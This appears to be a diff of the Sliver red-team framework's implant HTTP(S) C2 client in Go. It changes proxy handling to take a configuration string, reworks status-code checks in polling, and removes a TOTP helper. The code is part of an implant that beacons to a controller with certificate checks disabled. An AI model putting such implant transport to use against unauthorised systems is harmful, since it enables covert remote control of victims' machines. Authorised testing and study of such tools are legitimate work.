@@ -46,8 +46,6 @@ import (
 	"github.com/bishopfox/sliver/implant/sliver/encoders"
 	"github.com/bishopfox/sliver/implant/sliver/proxy"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
-	"github.com/pquerna/otp"
-	"github.com/pquerna/otp/totp"
 	"google.golang.org/protobuf/proto"
 )
 
@@ -59,14 +57,10 @@ const (
 	acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"
 )
 
-func init() {
-	insecureRand.Seed(time.Now().UnixNano())
-}
-
 // HTTPStartSession - Attempts to start a session with a given address
-func HTTPStartSession(address string, pathPrefix string) (*SliverHTTPClient, error) {
+func HTTPStartSession(address string, pathPrefix string, proxyConfig string) (*SliverHTTPClient, error) {
 	var client *SliverHTTPClient
-	client = httpsClient(address, true)
+	client = httpsClient(address, proxyConfig)
 	client.PathPrefix = pathPrefix
 	err := client.SessionInit()
 	if err != nil {
@@ -74,7 +68,7 @@ func HTTPStartSession(address string, pathPrefix string) (*SliverHTTPClient, err
 		if strings.HasSuffix(address, ":443") {
 			address = fmt.Sprintf("%s:80", address[:len(address)-4])
 		}
-		client = httpClient(address, true) // Fallback to insecure HTTP
+		client = httpClient(address, proxyConfig) // Fallback to insecure HTTP
 		err = client.SessionInit()
 		if err != nil {
 			return nil, err
@@ -257,6 +251,10 @@ func (s *SliverHTTPClient) getSessionID(sessionInit []byte) error {
 	return nil
 }
 
+var (
+	ErrStatusCodeUnexpected = errors.New("unexpected http response code")
+)
+
 // Poll - Perform an HTTP GET request
 func (s *SliverHTTPClient) Poll() ([]byte, error) {
 	if s.SessionID == "" || s.SessionKey == nil {
@@ -276,28 +274,35 @@ func (s *SliverHTTPClient) Poll() ([]byte, error) {
 		// {{end}}
 		return nil, err
 	}
-	if resp.StatusCode != 200 && resp.StatusCode != 201 {
-		return nil, errors.New("non-200 response code")
-	}
-	if resp.StatusCode == 403 {
+	if resp.StatusCode == http.StatusForbidden {
 		// {{if .Config.Debug}}
 		log.Printf("Server responded with invalid session for %v", s.SessionID)
 		// {{end}}
 		return nil, errors.New("invalid session")
 	}
-	var data []byte
-	respData, _ := ioutil.ReadAll(resp.Body)
-	defer resp.Body.Close()
-	if 0 < len(respData) {
-		data, err = encoder.Decode(respData)
-		if err != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Decoding failed %s", err)
-			// {{end}}
-			return nil, err
-		}
+	if resp.StatusCode == http.StatusNoContent {
+		return nil, nil
 	}
-	return GCMDecrypt(*s.SessionKey, data)
+	if resp.StatusCode == http.StatusOK {
+		var data []byte
+		respData, _ := ioutil.ReadAll(resp.Body)
+		defer resp.Body.Close()
+		if 0 < len(respData) {
+			data, err = encoder.Decode(respData)
+			if err != nil {
+				// {{if .Config.Debug}}
+				log.Printf("Decoding failed %s", err)
+				// {{end}}
+				return nil, err
+			}
+		}
+		return GCMDecrypt(*s.SessionKey, data)
+	}
+
+	// {{if .Config.Debug}}
+	log.Printf("[http] Unexpected status code %v", resp)
+	// {{end}}
+	return nil, ErrStatusCodeUnexpected
 }
 
 // Send - Perform an HTTP POST request
@@ -437,8 +442,8 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 
 // [ HTTP(S) Clients ] ------------------------------------------------------------
 
-func httpClient(address string, useProxy bool) *SliverHTTPClient {
-	httpTransport := &http.Transport{
+func httpClient(address string, proxyConfig string) *SliverHTTPClient {
+	transport := &http.Transport{
 		Dial:                proxy.Direct.Dial,
 		TLSHandshakeTimeout: defaultNetTimeout,
 		TLSClientConfig:     &tls.Config{InsecureSkipVerify: true}, // We don't care about the HTTP(S) layer certs
@@ -448,31 +453,15 @@ func httpClient(address string, useProxy bool) *SliverHTTPClient {
 		Client: &http.Client{
 			Jar:       cookieJar(),
 			Timeout:   defaultReqTimeout,
-			Transport: httpTransport,
+			Transport: transport,
 		},
 	}
-	if useProxy {
-		p := proxy.NewProvider("").GetHTTPProxy(client.Origin)
-		if p != nil {
-			// {{if .Config.Debug}}
-			log.Printf("Found proxy %#v\n", p)
-			// {{end}}
-			proxyURL := p.URL()
-			if proxyURL.Scheme == "" {
-				proxyURL.Scheme = "http"
-			}
-			// {{if .Config.Debug}}
-			log.Printf("Proxy URL = '%s'\n", proxyURL)
-			// {{end}}
-			httpTransport.Proxy = http.ProxyURL(proxyURL)
-			client.ProxyURL = proxyURL.String()
-		}
-	}
+	parseProxyConfig(client, transport, proxyConfig)
 	return client
 }
 
-func httpsClient(address string, useProxy bool) *SliverHTTPClient {
-	netTransport := &http.Transport{
+func httpsClient(address string, proxyConfig string) *SliverHTTPClient {
+	transport := &http.Transport{
 		Dial: (&net.Dialer{
 			Timeout: defaultNetTimeout,
 		}).Dial,
@@ -484,10 +473,20 @@ func httpsClient(address string, useProxy bool) *SliverHTTPClient {
 		Client: &http.Client{
 			Jar:       cookieJar(),
 			Timeout:   defaultReqTimeout,
-			Transport: netTransport,
+			Transport: transport,
 		},
 	}
-	if useProxy {
+	parseProxyConfig(client, transport, proxyConfig)
+	return client
+}
+
+func parseProxyConfig(client *SliverHTTPClient, transport *http.Transport, proxyConfig string) {
+	switch proxyConfig {
+	case "never":
+		break
+	case "":
+		fallthrough
+	case "auto":
 		p := proxy.NewProvider("").GetHTTPSProxy(client.Origin)
 		if p != nil {
 			// {{if .Config.Debug}}
@@ -500,11 +499,26 @@ func httpsClient(address string, useProxy bool) *SliverHTTPClient {
 			// {{if .Config.Debug}}
 			log.Printf("Proxy URL = '%s'\n", proxyURL)
 			// {{end}}
-			netTransport.Proxy = http.ProxyURL(proxyURL)
+			transport.Proxy = http.ProxyURL(proxyURL)
 			client.ProxyURL = proxyURL.String()
 		}
+	default:
+		// {{if .Config.Debug}}
+		log.Printf("Force proxy %#v\n", proxyConfig)
+		// {{end}}
+		proxyURL, err := url.Parse(proxyConfig)
+		if err != nil {
+			break
+		}
+		if proxyURL.Scheme == "" {
+			proxyURL.Scheme = "https"
+		}
+		// {{if .Config.Debug}}
+		log.Printf("Proxy URL = '%s'\n", proxyURL)
+		// {{end}}
+		transport.Proxy = http.ProxyURL(proxyURL)
+		client.ProxyURL = proxyURL.String()
 	}
-	return client
 }
 
 // Jar - CookieJar implementation that ignores domains/origins
@@ -540,21 +554,6 @@ func (jar *Jar) SetCookies(u *url.URL, cookies []*http.Cookie) {
 // restrictions such as in RFC 6265 (which we do not).
 func (jar *Jar) Cookies(u *url.URL) []*http.Cookie {
 	return jar.cookies
-}
-
-func GetOTPCode() string {
-	now := time.Now().UTC()
-	opts := totp.ValidateOpts{
-		Digits:    8,
-		Algorithm: otp.AlgorithmSHA256,
-		Period:    uint(30),
-		Skew:      uint(1),
-	}
-	code, _ := totp.GenerateCodeCustom("{{ .OTPSecret }}", now, opts)
-	// {{if .Config.Debug}}
-	log.Printf("HTTP(S) TOTP Code: %s", code)
-	// {{end}}
-	return code
 }
 
 // {{end}} -HTTPc2Enabled
